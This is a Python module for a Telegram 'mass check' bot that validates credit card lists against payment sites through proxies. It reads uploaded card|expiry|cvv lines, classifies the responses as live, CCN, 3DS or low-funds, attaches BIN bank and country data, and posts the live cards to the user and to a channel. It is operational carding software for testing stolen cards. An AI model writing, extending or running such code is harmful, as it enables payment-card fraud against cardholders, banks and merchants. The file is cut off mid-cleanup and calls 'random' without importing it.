import os
import re
import time
import logging
import threading
from telebot import types
from concurrent.futures import ThreadPoolExecutor, as_completed
from html import escape
import shutil
import glob
import json
from datetime import datetime
from shared_state import user_busy
from site_auth_manager import clone_user_site_files
from config import MAX_WORKERS
from shared_state import save_live_cc_to_json

# ================================================================
# ⚙️ CONFIG IMPORTS  (Matches your real config.py)
# ================================================================
from config import (
    BOT_TOKEN,
    CHANNEL_ID,
    ADMIN_ID,
    MAX_WORKERS,
    BATCH_SIZE,
    DELAY_BETWEEN_BATCHES,
)
from runtime_config import get_default_site  # ✅ dynamic fallback
DEFAULT_API_URL = get_default_site()

send_lock = threading.Lock()
last_send_time = 0.0
user_busy_lock = threading.Lock()  # ✅ added for global safety

from telebot.apihelper import ApiTelegramException

def safe_send_message(bot, target_id, text, **kwargs):
    """Send Telegram message safely, respecting flood limits."""
    import logging
    retry_count = 0
    while True:
        try:
            bot.send_message(target_id, text, **kwargs)
            break  # success
        except ApiTelegramException as e:
            msg = str(e)
            if "Flood control exceeded" in msg or "Too Many Requests" in msg:
                match = re.search(r"Retry in (\d+)", msg)
                wait = int(match.group(1)) if match else 5
                logging.warning(f"[FLOOD WAIT] Waiting {wait}s before retry...")
                time.sleep(wait + 1)
                retry_count += 1
                if retry_count > 3:
                    break
            else:
                logging.warning(f"[SEND ERROR] {e}")
                break
        except Exception as e:
            logging.warning(f"[SEND ERROR] {e}")
            break

# ================================================================
# 🧩 MODULE IMPORTS
# ================================================================
from site_auth_manager import process_card_for_user_sites, _load_state
from proxy_manager import get_user_proxy
from bininfo import round_robin_bin_lookup
from manual_check import country_to_flag

# ================================================================
# 🪶 LOGGING CONFIG
# ================================================================
BASE_DIR = os.path.dirname(__file__)
LOG_FILE = os.path.join(BASE_DIR, "mass_check_debug.log")

logging.basicConfig(
    level=logging.WARNING,
    format="[%(asctime)s] [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()],
)

logger = logging.getLogger("mass_check")
logger.info("🧠 MassCheck initialized with advanced stop system (config-synced)")

# ================================================================
# 🧠 GLOBAL STRUCTURES
# ================================================================
user_mass_locks = {}
user_mass_locks_lock = threading.Lock()

user_uploaded_files = {}
user_futures = {}
user_futures_lock = threading.Lock()

progress_lock = threading.Lock()
outfile_lock = threading.Lock()

stop_events = {}
stop_events_lock = threading.Lock()
activechecks = {}  # {user_id: Thread}

# ================================================================
# ⚠️ EXCEPTIONS
# ================================================================
class StopMassCheckException(Exception):
    """Raised to immediately abort mass check processing."""
    pass

# ================================================================
# 🧩 STOP SYSTEM
# ================================================================
LIVECC_BASE = os.path.join(os.getcwd(), "live-cc")

def ensure_livecc_folder(user_id: str):
    """Ensure that live-cc/<user_id>/ exists and return its path."""
    folder = os.path.join(LIVECC_BASE, str(user_id))
    os.makedirs(folder, exist_ok=True)
    return folder

def save_live_to_worker_file(user_id: str, worker_id: int, card_data: dict):
    """Save a single live card result to worker file."""
    folder = ensure_livecc_folder(user_id)
    file_path = os.path.join(folder, f"Live_cc_{user_id}_{worker_id}.json")
    try:
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                existing = json.load(f)
        else:
            existing = []
        existing.append(card_data)
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(existing, f, indent=2)
        logging.debug(f"[Worker {worker_id}] Saved live to {file_path}")
    except Exception as e:
        logging.error(f"[Worker {worker_id}] Error saving live: {e}")

def get_stop_event(chat_id: str):
    """Return (or create) a per-user stop event."""
    with stop_events_lock:
        if chat_id not in stop_events:
            stop_events[chat_id] = threading.Event()
        return stop_events[chat_id]

def set_stop_event(chat_id: str):
    """Activate stop event + create stop file for fallback."""
    with stop_events_lock:
        if chat_id not in stop_events:
            stop_events[chat_id] = threading.Event()
        stop_events[chat_id].set()

    stop_path = f"fstop{chat_id}.stop"
    try:
        with open(stop_path, "w") as f:
            f.write("stop")
        logger.info(f"[STOP FILE] Created {stop_path}")
    except Exception as e:
        logger.warning(f"[STOP FILE ERROR] Could not create stop file: {e}")
    logger.info(f"[STOP EVENT] Stop triggered for user {chat_id}")

def clear_stop_event(chat_id: str):
    """Reset stop flags and remove stop file."""
    with stop_events_lock:
        if chat_id in stop_events:
            del stop_events[chat_id]
            logger.info(f"[STOP EVENT] Cleared for {chat_id}")
    stop_path = f"fstop{chat_id}.stop"
    if os.path.exists(stop_path):
        try:
            os.remove(stop_path)
            logger.info(f"[STOP FILE] Removed {stop_path}")
        except Exception:
            pass

def is_stop_requested(chat_id: str):
    """Check both memory and file stop flags."""
    ev = stop_events.get(chat_id)
    if ev and ev.is_set():
        return True
    if os.path.exists(f"fstop{chat_id}.stop"):
        return True
    return False
# ================================================================
# 🧹 CLEANUP HELPERS
# ================================================================
def cleanup_all_raw_files(chat_id: str):
    """
    Completely delete all files related to a specific user ID.
    Includes raw_results, live_ccs, stop files, and sessions.
    """
    patterns = [
        f"raw_results_{chat_id}_*.txt",
        f"live_ccs_{chat_id}_*.txt",
        f"fstop{chat_id}.stop",
        f"sessions\\{chat_id}",
    ]
    cwd = os.getcwd()

    # ✅ Ensure all file handles are closed first
    try:
        for obj in globals().values():
            if hasattr(obj, "close") and callable(obj.close):
                try:
                    obj.close()
                except Exception:
                    pass
    except Exception:
        pass

    deleted_any = False

    for pattern in patterns:
        for path in glob.glob(os.path.join(cwd, pattern)):
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path, ignore_errors=True)
                    logger.info(f"[CLEANUP] Deleted folder for user {chat_id}: {path}")
                    deleted_any = True
                    continue

                # Multi-step file unlock/delete
                for attempt in range(1):
                    try:
                        with open(path, "a", encoding="utf-8") as f:
                            f.flush()
                        os.remove(path)
                        logger.info(f"[CLEANUP] Deleted file {os.path.basename(path)} (attempt {attempt+1})")
                        deleted_any = True
                        break
                    except PermissionError:
                        try:
                            tmp_path = path + f".del{attempt}"
                            os.replace(path, tmp_path)
                            os.remove(tmp_path)
                            logger.info(f"[CLEANUP] Renamed and deleted locked file {os.path.basename(path)} (attempt {attempt+1})")
                            deleted_any = True
                            break
                        except Exception:
                            time.sleep(1.0)
                    except FileNotFoundError:
                        break
                    except Exception as e:
                        logger.warning(f"[CLEANUP ERROR] {os.path.basename(path)}: {e}")
                        break
            except Exception as e:
                logger.warning(f"[CLEANUP ERROR] General cleanup failed for {path}: {e}")

    def _final_pass():
        for pattern in patterns:
            for path in glob.glob(os.path.join(cwd, pattern)):
                try:
                    if os.path.isdir(path):
                        shutil.rmtree(path, ignore_errors=True)
                    elif os.path.exists(path):
                        os.remove(path)
                        logger.info(f"[FINAL CLEANUP] Deleted leftover file {os.path.basename(path)}")
                except Exception as e:
                    logger.warning(f"[FINAL CLEANUP ERROR] {os.path.basename(path)}: {e}")

    import gc
    gc.collect()

    threading.Timer(2.0, _final_pass).start()

    if not deleted_any:
        logger.info(f"[CLEANUP] No leftover files found for user {chat_id}")

def cleanup_user_file(chat_id: str):
    """Delete the uploaded .txt file for this user."""
    path = user_uploaded_files.pop(chat_id, None)
    if path and os.path.exists(path):
        try:
            os.remove(path)
            logger.info(f"[CLEANUP] Deleted uploaded file {path} for {chat_id}")
        except Exception as e:
            logger.error(f"[CLEANUP ERROR] Failed to delete uploaded file {path}: {e}")

def cleanup_user_json(chat_id):
    """
    Rotate the user's live JSON file when it grows too large (>4 MB).
    Instead of deleting it, rename to a numbered backup.
    """
    folder = "live-cc"
    os.makedirs(folder, exist_ok=True)
    file_path = os.path.join(folder, f"Live_cc_{chat_id}.json")

    if os.path.exists(file_path):
        try:
            size = os.path.getsize(file_path)
            if size > 4 * 1024 * 1024:
                base, ext = os.path.splitext(file_path)
                index = 2
                rotated_path = f"{base}({index}){ext}"
                while os.path.exists(rotated_path):
                    index += 1
                    rotated_path = f"{base}({index}){ext}"
                os.rename(file_path, rotated_path)
                logger.info(f"[LIVE JSON ROTATE] {file_path} → {rotated_path}")
                with open(file_path, "w", encoding="utf-8") as f:
                    json.dump([], f, indent=2, ensure_ascii=False)
                logger.info(f"[LIVE JSON ROTATE] Created new empty file {file_path}")
        except Exception as e:
            logger.warning(f"[LIVE JSON ROTATE ERROR] {e}")

# ================================================================
# 🧾 PROGRESS BOARD (INLINE KEYBOARD)
# ================================================================
def build_status_keyboard(card, total, processed, status,
                          cvv, ccn, threed, low, declined,
                          checking, chat_id, reason=None):
    """Create an inline keyboard showing progress and stats."""
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(f"✧ {card} ✧", callback_data="noop"))

    if reason:
        keyboard.add(types.InlineKeyboardButton(f"✧ {reason} ✧", callback_data="noop"))
    else:
        keyboard.add(types.InlineKeyboardButton(f"✧ STATUS → {status} ✧", callback_data="noop"))

    keyboard.add(types.InlineKeyboardButton(f"✧ CVV → [ {cvv} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ CCN → [ {ccn} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ 3DS → [ {threed} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ LOW FUNDS → [ {low} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ DECLINED → [ {declined} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ TOTAL ➜ [ {processed}/{total} ] ✧", callback_data="noop"))
    if checking:
        keyboard.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{chat_id}"))
    return keyboard

# ================================================================
# 🧭 THREAD WRAPPER (For main.py)
# ================================================================
def run_mass_check_thread(bot, message, allowed_users=None):
    """Spawn a per-user background thread to run handle_file()."""
    chat_id = str(message.chat.id)
    if chat_id in activechecks:
        bot.reply_to(message, "⚠ Already running. Please wait for your previous session.")
        return
    t = threading.Thread(target=handle_file, args=(bot, message, allowed_users), daemon=True)
    activechecks[chat_id] = t
    t.start()
    logger.info(f"[THREAD] Mass check thread launched for {chat_id}")
# ================================================================
# 📂 MAIN MASS CHECK HANDLER
# ================================================================
def handle_file(bot, message, allowed_users=None):
    chat_id = str(message.chat.id)
    stop_event = get_stop_event(chat_id)

    # 🚦 Prevent overlap with manual or another mass check
    with user_busy_lock:
        if user_busy.get(chat_id):
            bot.reply_to(message, "⚠ You already have an active check running (manual or mass). Please wait.")
            return
        user_busy[chat_id] = True

    stop_event.clear()
    clear_stop_event(chat_id)
    cleanup_all_raw_files(chat_id)

    if chat_id in activechecks and activechecks[chat_id].is_alive():
        bot.reply_to(message, "⚠ You already have an active mass check.")
        with user_busy_lock:
            user_busy.pop(chat_id, None)
        return

    # 🧠 Create per-user lock
    with user_mass_locks_lock:
        if chat_id not in user_mass_locks:
            user_mass_locks[chat_id] = threading.Lock()
        lock = user_mass_locks[chat_id]

    if not lock.acquire(blocking=False):
        bot.reply_to(message, "⚠ Already running. Please wait for your current check to finish.")
        with user_busy_lock:
            user_busy.pop(chat_id, None)
        return

    # Download the user’s file
    try:
        doc = message.document
        temp_path = os.path.join(os.getcwd(), doc.file_name)
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        with open(temp_path, "wb") as f:
            f.write(downloaded)
        user_uploaded_files[chat_id] = temp_path
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to download file: {e}")
        lock.release()
        with user_busy_lock:
            user_busy.pop(chat_id, None)
        return

    # Parse valid cards
    valid_cards = []
    try:
        with open(temp_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                normalized = re.sub(r"\s*\|\s*", "|", line)
                if len(normalized.split("|")) == 4:
                    valid_cards.append(normalized)
    except Exception as e:
        bot.reply_to(message, f"❌ File read error: {e}")
        lock.release()
        with user_busy_lock:
            user_busy.pop(chat_id, None)
        return

    if not valid_cards:
        bot.reply_to(message, "❌ No valid cards found in file.")
        cleanup_user_file(chat_id)
        lock.release()
        with user_busy_lock:
            user_busy.pop(chat_id, None)
        return

    counters = {
        "cvv": 0, "ccn": 0, "low": 0, "declined": 0,
        "threed": 0, "total_processed": 0,
        "total_cards": len(valid_cards),
    }

    reply_msg = bot.reply_to(
        message,
        f"Processing 0/{len(valid_cards)} cards...",
        reply_markup=build_status_keyboard(
            "Waiting", len(valid_cards), 0, "Idle",
            0, 0, 0, 0, 0, True, chat_id
        )
    )

    live_cc_results = []
    raw_file = f"raw_results_{chat_id}_{int(time.time())}.txt"

    # ============================================================
    # 🧵 THREADED CARD PROCESSING
    # ============================================================
    clone_user_site_files(chat_id, MAX_WORKERS)
    with open(raw_file, "w", encoding="utf-8") as outfile:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # 🧭 Watchdog thread
            def monitor_stop():
                while not is_stop_requested(chat_id):
                    time.sleep(1)
                try:
                    logger.warning(f"[WATCHDOG] Stop detected — shutting down executor for {chat_id}")
                    executor.shutdown(wait=False, cancel_futures=True)
                except Exception as e:
                    logger.error(f"[WATCHDOG ERROR] {e}")

            threading.Thread(target=monitor_stop, daemon=True).start()

            futures = []
            with user_futures_lock:
                user_futures[chat_id] = []

            def cancel_pending_futures():
                with user_futures_lock:
                    if chat_id in user_futures:
                        for fut in user_futures[chat_id]:
                            if not fut.done() and not fut.cancelled():
                                fut.cancel()

            # ----------------------------------------------------
            # DEFINE WORKER FUNCTION
            # ----------------------------------------------------
            def process_one(card, worker_id=None):
                """Worker: process a single card with instant stop checks."""
                if is_stop_requested(chat_id):
                    raise StopMassCheckException()

                start_time = time.time()
                result_site = None
                result = {"status": "DECLINED", "reason": "Unknown error", "_used_proxy": False}

                try:
                    user_proxy = get_user_proxy(chat_id)
                    result_site, result = process_card_for_user_sites(
                        card, chat_id, proxy=user_proxy, worker_id=worker_id
                    )
                    from site_auth_manager import normalize_result
                    if isinstance(result, dict):
                        normalized = normalize_result(result.get("status"), result.get("reason", ""))
                        result.update({
                            "status": normalized["status"],
                            "top_status": normalized["top_status"],
                            "display_status": normalized["display_status"],
                            "message": normalized["message"],
                            "emoji": normalized["emoji"],
                        })
                    if isinstance(result, dict) and "_used_proxy" not in result:
                        result["_used_proxy"] = bool(user_proxy)
                    if not isinstance(result, dict):
                        result = {"status": "DECLINED", "reason": "Invalid result"}
                except Exception as e:
                    logger.error(f"[MassCheck] Error processing {card}: {e}")
                    result = {"status": "DECLINED", "reason": str(e)}

                if is_stop_requested(chat_id):
                    raise StopMassCheckException()

                elapsed = time.time() - start_time
                logger.info(f"[MassCheck] {card[:6]}**** processed in {elapsed:.2f}s → {result.get('status')}")
                return (card, result_site, result, elapsed)

            # ----------------------------------------------------
            # QUEUE ALL CARDS
            # ----------------------------------------------------
            for idx, card in enumerate(valid_cards):
                if is_stop_requested(chat_id):
                    break
                worker_id = (idx % MAX_WORKERS) + 1
                future = executor.submit(process_one, card, worker_id)
                futures.append(future)
                with user_futures_lock:
                    user_futures[chat_id].append(future)
            # ----------------------------------------------------
            # PROCESS RESULTS AS THEY COMPLETE
            # ----------------------------------------------------
            try:
                for idx, future in enumerate(as_completed(futures), start=1):
                    # ⚡ Instant stop detection before handling each card
                    if is_stop_requested(chat_id):
                        raise StopMassCheckException()


                    try:
                        card_result = future.result(timeout=45)
                        if not card_result:
                            continue

                        card, result_site, result, elapsed = card_result
                        status = result.get("status", "DECLINED")
                        message_text = result.get("message", result.get("reason", "Unknown response."))

                        # 🧩 Clarify declined reasons
                        if status.upper() == "DECLINED":
                            reason_lower = message_text.lower()
                            if "stripe" in reason_lower:
                                message_text = "DECLINED (Stripe Token Error)"
                            elif "site" in reason_lower:
                                message_text = "DECLINED (Site Response Failed)"
                            elif "timeout" in reason_lower or "connection" in reason_lower:
                                message_text = "DECLINED (Connection Timeout)"

                        # refine declined reason
                        if status == "DECLINED":
                            reason_lower = message_text.lower()
                            if "stripe" in reason_lower:
                                message_text = "Declined (Stripe Token Error)"
                            elif "site" in reason_lower:
                                message_text = "Declined (Site Response Failed)"

                        message_text = re.sub(
                            r"\bcard declined\s*\(.*your card was declined.*\)",
                            "Your card was declined",
                            message_text,
                            flags=re.I
                        ).strip()

                        if "your card was declined" in message_text.lower() and "(" in message_text:
                            message_text = "Your card was declined."

                        # -----------------------------------------
                        # 💳 CLASSIFY RESULT TYPE
                        # -----------------------------------------
                        if message_text == "CARD ADDED":
                            message_text = "Auth access🔥"

                        emoji_map = {
                            "CCN": "🔥",
                            "DECLINED": " ",
                            "PAYMENT_ADDED": "✅",
                            "CARD ADDED": "✅",
                            "INSUFFICIENT_FUNDS": "😢",
                            "CVV": "⚠️",
                            "3DS_REQUIRED": "⚠️"
                        }
                        emoji = emoji_map.get(status, "❔")
                        top_status = "DECLINED"
                        count_as = "declined"
                        send_message = False

                        msg_lower = message_text.lower()

                        if any(x in msg_lower for x in ["card number is incorrect", "your card is incorrect", "incorrect number"]):
                            top_status, count_as, send_message = "Declined ❌", "declined", False

                        elif any(x in msg_lower for x in ["does not support", "unsupported", "not supported"]):
                            top_status, count_as, send_message = "CVV ⚠️", "cvv", True

                        elif any(x in msg_lower for x in ["requires_action", "3ds", "authentication required"]):
                            top_status, count_as, send_message = "3DS ⚠️", "threed", True

                        elif any(x in msg_lower for x in ["insufficient", "low balance", "not enough funds"]):
                            top_status, count_as, send_message = "Insufficient Funds 💵", "low", True

                        elif any(x in msg_lower for x in [
                            "security", "cvc", "cvv", "invalid cvc", "incorrect cvc",
                            "security code incorrect", "your card security", "card security incorrect"
                        ]):
                            top_status, count_as, send_message = "CCN ✅", "ccn", True
                            message_text = "Your card security is incorrect."

                        elif any(x in msg_lower for x in ["expired", "expiration", "invalid expiry"]):
                            top_status, count_as, send_message = "Declined ❌", "declined", False

                        elif status in ("PAYMENT_ADDED", "CARD ADDED"):
                            top_status, count_as, send_message = "Approved ✅", "cvv", True

                        else:
                            top_status, count_as, send_message = "Declined ❌", "declined", False

                        # ✅ Save to per-worker JSON if LIVE
                        if send_message and top_status.startswith(("Approved", "CCN", "Insufficient", "3DS")):
                            live_entry = {
                                "cc": card,
                                "status": top_status,
                                "site": result_site,
                                "scheme": result.get("scheme", ""),
                                "type": result.get("type", ""),
                                "brand": result.get("brand", ""),
                                "bank": result.get("bank", ""),
                                "country": result.get("country", ""),
                                "proxy": result.get("_used_proxy", False),
                                "message": message_text
                            }
                            save_live_cc_to_json(chat_id, worker_id, live_entry)

                        # -----------------------------------------
                        # Update counters safely
                        # -----------------------------------------
                        with progress_lock:
                            counters["total_processed"] += 1
                            counters[count_as] += 1

                        # -----------------------------------------
                        # 💬 BUILD RESULT MESSAGE
                        # -----------------------------------------
                        if send_message:
                            try:
                                proxy_state = "Live ✅" if result.get("_used_proxy") else "None"
                                try:
                                    bin_info = round_robin_bin_lookup(card.split("|")[0])
                                    scheme = bin_info.get("scheme", "Unknown")
                                    ctype = bin_info.get("type", "Unknown")
                                    brand = bin_info.get("brand", "Unknown")
                                    bank = bin_info.get("bank", "Unknown Bank")
                                    country = bin_info.get("country", "Unknown Country")
                                except Exception:
                                    scheme = ctype = brand = bank = country = "Unknown"

                                try:
                                    user = bot.get_chat(chat_id)
                                    username_display = (
                                        user.first_name or user.last_name or f"@{user.username}" or f"User {chat_id}"
                                    )
                                except Exception:
                                    username_display = f"User {chat_id}"

                                # 🔄 Site index lookup
                                try:
                                    from runtime_config import get_default_site
                                    default_site = get_default_site()
                                    state = _load_state(chat_id)
                                    user_sites = list(state.get(str(chat_id), {}).get("sites", {}).keys()) or [default_site]
                                    site_num = user_sites.index(result_site) + 1 if result_site in user_sites else None
                                    if len(user_sites) <= 1:
                                        site_num = None
                                except Exception:
                                    site_num = None

                                if status == "CARD ADDED":
                                    status = "Card Added"
                                # Build detailed message
                                detail_msg = (
                                    f"<code><b>{top_status}</b></code>\n"
                                    f"━━━━━━━━━━━━━━━━━━\n"
                                    f"<code>✧ <b>Card:</b></code> <code>{card}</code>\n"
                                    f"<code>✧ <b>Status:</b> {status}{emoji}</code>\n"
                                    f"<code>✧ <b>Message:</b> {message_text}</code>\n"
                                    f"<code>✧ <b>Type:</b> {scheme} | {ctype} | {brand}</code>\n"
                                    f"<code>✧ <b>Bank:</b> {escape(bank)}</code>\n"
                                    f"<code>✧ <b>Country:</b> {escape(country)} {country_to_flag(country)}</code>\n"
                                    f"<code>✧ <b>Proxy:</b> {proxy_state}</code>"
                                    f"{f' <code>[{site_num}]</code>' if site_num else ''}\n"
                                    f"<code>✧ <b>Checked by:</b></code><code>{escape(username_display)}</code> "
                                    f"<code>[</code><code>{chat_id}</code><code>]</code>\n"
                                    f"<code>✧ <b>Time:</b> {elapsed:.2f}s ⏳</code>\n"
                                    f"━━━━━━━━━━━━━━━━━━\n"
                                )

                                with outfile_lock:
                                    live_cc_results.append({
                                        "cc": card,
                                        "status": top_status,
                                        "scheme": scheme,
                                        "type": ctype,
                                        "brand": brand,
                                        "bank": bank,
                                        "country": country,
                                        "proxy": proxy_state
                                    })
                                    save_live_cc_to_json(
                                        chat_id, worker_id,
                                        {
                                            "cc": card,
                                            "status": top_status,
                                            "scheme": scheme,
                                            "type": ctype,
                                            "brand": brand,
                                            "bank": bank,
                                            "country": country,
                                            "proxy": proxy_state
                                        }
                                    )

                                    time.sleep(0.05)
                                    if idx % 5000 == 0:
                                        cleanup_user_json(chat_id)

                                    outfile.write(detail_msg + "\n")
                                    outfile.flush()

                                    # 🕒 Send with gap to avoid flood limits
                                    # 🕒 Non-blocking send to avoid flood limits
                                    try:
                                        # Send to user in background
                                        threading.Thread(
                                            target=safe_send_message,
                                            args=(bot, chat_id, detail_msg),
                                            kwargs={"parse_mode": "HTML", "disable_web_page_preview": True},
                                            daemon=True
                                        ).start()

                                        # Send to channel in background
                                        threading.Thread(
                                            target=safe_send_message,
                                            args=(bot, CHANNEL_ID, detail_msg),
                                            kwargs={"parse_mode": "HTML", "disable_web_page_preview": True},
                                            daemon=True
                                        ).start()

                                        # Small randomized cooldown between sends
                                        time.sleep(random.uniform(0.2, 0.6))

                                    except Exception as e:
                                        logger.warning(f"[LIVE RESULT SEND ERROR] {e}")

                            except Exception as e:
                                logger.warning(f"[LIVE RESULT ERROR] {e}")

                        # -----------------------------------------
                        # 🔁 UPDATE PROGRESS BOARD
                        # -----------------------------------------
                        with progress_lock:
                            processed = counters["total_processed"]
                            total_cards = counters["total_cards"]
                            cvv = counters["cvv"]
                            ccn = counters["ccn"]
                            threed = counters["threed"]
                            low = counters["low"]
                            declined = counters["declined"]

                            msg_lower = message_text.lower()
                            if any(x in msg_lower for x in ["card number is incorrect", "your card is incorrect", "incorrect number"]):
                                short_reason = "Your card number is incorrect"
                            elif any(x in msg_lower for x in ["does not support", "unsupported"]):
                                short_reason = "Your card does not support this type of purchase"
                            elif any(x in msg_lower for x in ["requires_action", "3ds", "authentication required"]):
                                short_reason = "3DS"
                            elif any(x in msg_lower for x in ["insufficient", "low balance"]):
                                short_reason = "Insufficient funds"
                            elif any(x in msg_lower for x in ["security code", "cvc", "cvv"]):
                                short_reason = "Your card security is incorrect"
                            elif any(x in msg_lower for x in ["expired", "expiration"]):
                                short_reason = "Card expired"
                            elif "stripe" in msg_lower:
                                short_reason = "Stripe Token Error"
                            elif "site" in msg_lower:
                                short_reason = "Site Response Failed"
                            else:
                                short_reason = message_text

                        checking = not is_stop_requested(chat_id)
                        status_text = f"Processing {processed}/{total_cards} cards..."
                        kb = build_status_keyboard(
                            card, total_cards, processed, top_status,
                            cvv, ccn, threed, low, declined,
                            checking, chat_id,
                            reason=short_reason
                        )

                        try:
                            bot.edit_message_text(
                                chat_id=reply_msg.chat.id,
                                message_id=reply_msg.message_id,
                                text=status_text,
                                reply_markup=kb,
                            )
                        except Exception as e:
                            if "message is not modified" not in str(e).lower():
                                logger.info(f"[PROGRESS BOARD ERROR] {e}")

                        # -----------------------------------------
                        # 🕒 Silent cooldown every 5 cards
                        # -----------------------------------------
                        if idx % 5 == 0 and not is_stop_requested(chat_id):
                            pause_time = 1
                            for _ in range(pause_time):
                                if is_stop_requested(chat_id):
                                    raise StopMassCheckException()
                                time.sleep(1)

                        # Small per-card delay
                        time.sleep(0.3)

                    except StopMassCheckException:
                        logger.info(f"[MassCheck] Stop requested for {chat_id}")
                        break
                    except Exception as e:
                        logger.error(f"[RESULT LOOP ERROR] {e}")
            finally:
                # ✅ Ensure all futures are canceled on stop or error
                try:
                    if is_stop_requested(chat_id):
                        logger.warning(f"[FINALLY] Stop detected mid-run for {chat_id} — canceling remaining futures.")
                        with user_futures_lock:
                            if chat_id in user_futures:
                                for fut in user_futures[chat_id]:
                                    if not fut.done() and not fut.cancelled():
                                        fut.cancel()
                        executor.shutdown(wait=False, cancel_futures=True)
                    else:
                        executor.shutdown(wait=True, cancel_futures=False)
                except Exception as e:
                    logger.error(f"[FINALLY ERROR] Executor cleanup failed: {e}")
            # ============================================================
            # 🧹 AFTER PROCESSING — CLEANUP AND SUMMARY
            # ============================================================
            with user_futures_lock:
                user_futures.pop(chat_id, None)

            # ============================================================
            # 🛑 STOP HANDLING
            # ============================================================
            if is_stop_requested(chat_id):
                live_count = len(live_cc_results)
                total = counters["total_processed"]
                cancel_pending_futures()

                summary = (
                    f"🛑 <b>Mass Check Stopped</b>\n\n"
                    f"<b>Processed:</b> {total}/{counters['total_cards']}\n"
                    f"<b>CVV:</b> {counters['cvv']}\n"
                    f"<b>CCN:</b> {counters['ccn']}\n"
                    f"<b>3DS:</b> {counters['threed']}\n"
                    f"<b>LOW FUNDS:</b> {counters['low']}\n"
                    f"<b>DECLINED:</b> {counters['declined']}\n"
                )

                try:
                    bot.send_message(chat_id, summary, parse_mode="HTML")
                except Exception as e:
                    logger.warning(f"[STOP SUMMARY ERROR] {e}")

                # Send partial lives
                if live_count > 0:
                    output_file = f"live_ccs_{chat_id}_results.txt"
                    with open(output_file, "w", encoding="utf-8") as f:
                        for e in live_cc_results:
                            f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")
                    try:
                        with open(output_file, "rb") as f:
                            caption = f"🛑 {live_count} Live CCs Found (Stopped Early)"
                            bot.send_document(chat_id, f, caption=caption)
                            try:
                                f.seek(0)
                                bot.send_document(
                                    CHANNEL_ID, f,
                                    caption=f"🛑 {live_count} Live CCs Found (Stopped Early, User {chat_id})"
                                )
                            except Exception as e:
                                logger.warning(f"[CHANNEL STOP SEND ERROR] {e}")
                    except Exception as e:
                        logger.warning(f"[STOP SEND DOC ERROR] {e}")

                    logger.info(f"[STOP CLEANUP] Waiting 5s before deleting raw files for {chat_id}")
                    time.sleep(1)
                    try:
                        cleanup_all_raw_files(chat_id)
                        logger.info(f"[STOP CLEANUP] Deleted raw files for {chat_id}")
                    except Exception as e:
                        logger.warning(f"[STOP CLEANUP ERROR] {e}")

                    try:
                        os.remove(output_file)
                    except Exception:
                        pass

                try:
                    bot.delete_message(reply_msg.chat.id, reply_msg.message_id)
                except Exception:
                    pass

                # ✅ Non-blocking STOP cleanup
                try:
                    if lock.locked():
                        lock.release()
                    user_busy[chat_id] = False
                    activechecks.pop(chat_id, None)
                    clear_stop_event(chat_id)

                    logger.info(f"[STOP] User {chat_id} requested stop — releasing resources early.")

                    threading.Thread(target=cleanup_user_file, args=(chat_id,), daemon=True).start()
                    threading.Thread(target=cleanup_user_json, args=(chat_id,), daemon=True).start()
                    threading.Thread(target=cleanup_all_raw_files, args=(chat_id,), daemon=True).start()
                except Exception as e:
                    logger.error(f"[STOP CLEANUP ERROR] {e}")

                return

            # ============================================================
            # ✅ NORMAL COMPLETION SUMMARY
            # ============================================================
            live_count = len(live_cc_results)
            total = counters["total_processed"]

            summary = (
                f"✅ <b>Mass Check Completed</b>\n"
                f"<b>Total Processed:</b> {total}/{counters['total_cards']}\n"
                f"<b>CVV:</b> {counters['cvv']}\n"
                f"<b>CCN:</b> {counters['ccn']}\n"
                f"<b>3DS:</b> {counters['threed']}\n"
                f"<b>LOW FUNDS:</b> {counters['low']}\n"
                f"<b>DECLINED:</b> {counters['declined']}\n"
            )

            try:
                bot.delete_message(reply_msg.chat.id, reply_msg.message_id)
            except Exception:
                pass

            cleanup_user_file(chat_id)
            cleanup_all_raw_files(chat_id)

            # Send results file
            if live_count > 0:
                try:
                    bot.send_message(chat_id, summary, parse_mode="HTML")
                except Exception:
                    pass

                output_file = f"live_ccs_{chat_id}_results.txt"
                with open(output_file, "w", encoding="utf-8") as f:
                    for e in live_cc_results:
                        f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")

                if os.path.exists(output_file):
                    try:
                        with open(output_file, "rb") as f:
                            caption = f"✅ {live_count} Live CCs Found"
                            bot.send_document(chat_id, f, caption=caption)
                            try:
                                f.seek(0)
                                bot.send_document(
                                    CHANNEL_ID, f,
                                    caption=f"✅ {live_count} Live CCs Found (User {chat_id})"
                                )
                            except Exception as e:
                                logger.warning(f"[CHANNEL SEND ERROR] {e}")
                    except Exception:
                        pass
                    try:
                        os.remove(output_file)
                    except Exception:
                        pass
            else:
                try:
                    bot.send_message(chat_id, f"{summary}\nNo live CCs found.", parse_mode="HTML")
                except Exception:
                    pass
        # ============================================================
        # 🧹 FINAL CLEANUP (Handles both stop & normal completion)
        # ============================================================
        try:
            # ⏳ Wait briefly to ensure all threads and file handles are fully released
            time.sleep(1.5)

            # 🔒 Explicitly close all file handles to avoid Windows "in use" error
            for obj in globals().values():
                if hasattr(obj, "close") and callable(obj.close):
                    try:
                        obj.close()
                    except Exception:
                        pass

            # 🧼 Delete uploaded input file first
            cleanup_user_file(chat_id)

            # 🧹 Delay raw result cleanup to ensure outfile handle fully closed
            time.sleep(0.5)
            cleanup_all_raw_files(chat_id)
            user_busy.pop(chat_id, None)
            activechecks.pop(chat_id, None)

            # 🧠 Remove user tracking safely
